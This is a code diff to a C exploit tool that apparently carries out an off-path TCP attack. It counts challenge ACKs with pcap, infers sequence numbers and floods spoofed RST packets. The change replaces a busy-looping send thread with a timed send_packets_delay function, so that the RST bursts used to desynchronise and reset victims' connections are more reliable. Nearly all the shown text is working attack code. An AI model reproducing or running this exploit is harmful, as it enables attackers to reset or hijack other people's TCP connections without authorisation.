@@ -91,9 +91,6 @@ typedef struct thctx_struct {
 	conn_t conn_legit;
 	conn_t conn_spoof;
 	struct sockaddr_in *cli;
-	packet_t *pkt;
-	int numpkts;
-	suseconds_t delay;
 	uint16_t winsz; // initial TCP window size
 } thctx_t;
 
@@ -294,42 +291,35 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, uint16_t lport, int *off
 
 
 /*
- * a thread to spam packets =)
+ * a function to send a certain number of packets with a delay
  */
-void *send_thread(void *arg)
+int send_packets_delay(packet_t *ppkt, int count, suseconds_t us_delay)
 {
 	struct timeval start, now, diff;
-	int j;
 
-	while (1) {
-#if 0
-		if (g_ctx.numpkts > 0)
-			printf("[*] Sending %d packets...\n", g_ctx.numpkts);
+#ifdef DEBUG_SEND_PACKETS_DELAY
+	printf("[*] Sending %d packets...\n", count);
 #endif
-		while (g_ctx.numpkts > 0) {
-			gettimeofday(&start, NULL);
+	while (count > 0) {
+		gettimeofday(&start, NULL);
+		if (pcap_sendpacket(g_ctx.pch, ppkt->buf, ppkt->len) == -1)
+			return 0;
+		count--;
 
-			pcap_sendpacket(g_ctx.pch, (void *)g_ctx.pkt->buf, g_ctx.pkt->len);
-
-			g_ctx.numpkts--;
-
-			do {
-				gettimeofday(&now, NULL);
-				timersub(&now, &start, &diff);
-			} while (diff.tv_usec < g_ctx.delay);
-#ifdef DEBUG_SEND_THREAD_TIME
-			printf("%d %lu %lu\n", g_ctx.numpkts, diff.tv_sec, diff.tv_usec);
+		do {
+			gettimeofday(&now, NULL);
+			timersub(&now, &start, &diff);
+		} while (diff.tv_usec < us_delay);
+#ifdef DEBUG_SEND_PACKETS_DELAY
+		printf("    sent in %lu %lu\n", diff.tv_sec, diff.tv_usec);
 #endif
-		}
-		usleep(250);
 	}
-	return NULL;
+	return 1;
 }
 
 /*
  * a thread to receive packets =)
  */
-
 void *recv_thread(void *arg)
 {
 	struct pcap_pkthdr *pchdr = NULL;
@@ -407,9 +397,9 @@ int prepare_rst_packet(packet_t *ppkt)
 int conduct_offpath_attack(void)
 {
 	int chack_cnt[4] = { 0 };
-	int i, round = 0;
+	int round = 0;
 	packet_t rst_pkt;
-	pthread_t sth, rth;
+	pthread_t rth;
 	struct timeval start, now, diff;
 	astate_t attack_state = AS_SYNC;
 	volatile conn_t *spoof;
@@ -423,18 +413,9 @@ int conduct_offpath_attack(void)
 	if (!prepare_rst_packet(&rst_pkt))
 		return 0;
 
-	/* spawn the recv thread first
-	 * it will live throughout the attack process...
-	 */
+	/* spawn the recv thread. it will live throughout the attack process... */
 	if (pthread_create(&rth, NULL, recv_thread, NULL)) {
 		fprintf(stderr, "[!] failed to start recv thread!\n");
-		return 0;
-	}
-
-	/* spawn the send thread */
-	if (pthread_create(&sth, NULL, send_thread, NULL)) {
-		fprintf(stderr, "[!] failed to start send thread!\n");
-		pthread_cancel(rth);
 		return 0;
 	}
 
@@ -442,8 +423,6 @@ int conduct_offpath_attack(void)
 		struct timeval round_start;
 
 		gettimeofday(&round_start, NULL);
-
-		g_ctx.delay = 5000;
 
 		if (g_chack_cnt > 0) {
 			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
@@ -460,10 +439,8 @@ int conduct_offpath_attack(void)
 			 *
 			 * the goal is exactly 100 challenge ACKs received...
 			 */
-			g_ctx.pkt = &rst_pkt;
-			g_ctx.numpkts = 200;
-			while (g_ctx.numpkts > 0)
-				usleep(250);
+			if (!send_packets_delay(&rst_pkt, 200, 5000))
+				return 0;
 #ifdef DEBUG_SEND_TIME
 			gettimeofday(&now, NULL);
 			timersub(&now, &round_start, &diff);
@@ -600,9 +577,10 @@ int conduct_offpath_attack(void)
 			}
 
 			/* send 100 RSTs */
-			g_ctx.numpkts = 100;
-			while (g_ctx.numpkts > 0)
-				usleep(250);
+			if (!send_packets_delay(&rst_pkt, 100, 1000))
+				return 0;
+
+			/* check if total send time de-synchronized us */
 			gettimeofday(&now, NULL);
 			timersub(&now, &round_start, &diff);
 #ifdef DEBUG_SEND_TIME
@@ -691,9 +669,10 @@ int conduct_offpath_attack(void)
 			printf("[*] seq-infer: spoofed %d RSTs in %lu %lu\n", (int)(seq_block - seq_last_block), diff.tv_sec, diff.tv_usec);
 
 			/* send 100 RSTs */
-			g_ctx.numpkts = 100;
-			while (g_ctx.numpkts > 0)
-				usleep(250);
+			if (!send_packets_delay(&rst_pkt, 100, 1000))
+				return 0;
+
+			/* check if total send time de-synchronized us */
 			gettimeofday(&now, NULL);
 			timersub(&now, &round_start, &diff);
 #ifdef DEBUG_SEND_TIME
